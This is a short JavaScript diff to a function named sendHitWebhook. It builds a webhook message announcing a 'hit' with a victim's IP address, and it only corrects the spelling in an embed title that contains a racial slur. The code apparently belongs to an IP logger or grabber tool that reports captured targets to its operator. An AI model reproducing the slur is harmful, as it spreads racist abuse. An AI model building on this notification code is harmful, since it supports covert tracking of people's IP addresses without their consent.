@@ -8,7 +8,7 @@ export async function sendHitWebhook(userId, hitName, ipAddress) {
     username: 'Allen wood',
     embeds: [
       {
-        title: 'Cam down ni**er you got the hit ',
+        title: 'Came down ni**er you got the hit ',
         color: 0x00FF00, // Green
         fields: [
           { name: 'IP Address', value: `\`${ipAddress}\``, inline: false }
